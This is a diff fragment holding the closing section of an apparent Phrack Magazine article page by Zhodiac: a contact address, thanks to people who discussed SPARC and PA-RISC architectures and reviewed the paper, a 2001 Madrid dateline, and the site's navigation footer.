+ [5]  You can mail me with any doubt you have :) 
+      Zhodiac &lt;zhodiac@softhome.net&gt;
+
+
+--[ 6.- Greetings
+
+     - [CrAsH], without her support this document would not exist. :***
+     - DarkCode for long long time talking about SPARC and PA-RISC 
+          archs :)
+     - Fyodor Yarochkin for the few, but great, chats we had about 
+          PA-RISC. For the review of this paper. Thx. 
+     - El Nahual for having fun in real and net-life ;P I owe you a mail. 
+     - 0xdeadcafe mail-list for great discussion topics.
+
+
+Madrid 11/10/2001
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
